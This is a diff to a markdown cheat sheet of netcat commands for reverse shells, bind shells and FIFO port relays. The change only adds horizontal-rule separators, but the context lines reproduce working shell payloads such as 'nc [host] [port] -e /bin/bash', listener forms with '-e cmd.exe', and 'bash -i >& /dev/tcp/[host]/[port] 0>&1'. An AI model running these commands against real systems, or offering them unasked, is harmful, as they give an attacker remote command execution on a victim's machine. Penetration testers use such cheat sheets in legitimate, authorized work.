@@ -4,7 +4,7 @@ Useful netcat commands such as Reverse Shells, Port Relays via FIFO, and others 
 
 
 
-
+***
 
 
 
@@ -15,6 +15,7 @@ Listen for inbound connection over TCP. This can be used to receive reverse shel
 ```
 nc -lv -p [port]
 ```
+---
 
 
 
@@ -24,7 +25,7 @@ Initiate an outbound connection over TCP to a `[host]` which is listening on tha
 ```
 nc [host] [port]
 ```
-
+---
 
 
 
@@ -35,7 +36,7 @@ nc [host] [port] -e /bin/bash
 nc [host] [port] -e /bin/sh
 nc [host] [port] -e cmd.exe
 ```
-
+---
 
 
 
@@ -46,7 +47,7 @@ nc -l -p [port] -e /bin/bash
 nc -l -p [port] -e /bin/sh
 nc -l -p [port] -e cmd.exe
 ```
-
+---
 
 
 
@@ -57,7 +58,7 @@ bash -i >& /dev/tcp/[host]/[port] 0>&1
 sh -i >& /dev/tcp/[host]/[port] 0>&1
 python -i >& /dev/tcp/[host]/[port] 0>&1
 ```
-
+---
 
 
 
@@ -91,7 +92,7 @@ nc -l -p [port] 0< [pipe-name] | bash -i 1> [pipe-name]
 nc -l -p [port] 0< [pipe-name] | sh -i 1> [pipe-name]
 nc -l -p [port] 0< [pipe-name] | python -i 1> [pipe-name]
 ```
-
+---
 
 
 
